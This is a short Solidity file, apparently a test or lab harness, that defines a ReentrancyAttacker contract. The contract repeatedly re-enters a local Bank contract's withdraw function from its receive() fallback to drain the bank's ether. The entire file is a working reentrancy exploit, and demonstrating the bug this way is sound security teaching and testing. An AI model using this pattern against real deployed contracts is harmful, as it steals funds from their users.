// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Bank} from "../src/Bank.sol";

contract ReentrancyAttacker {
    Bank bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}
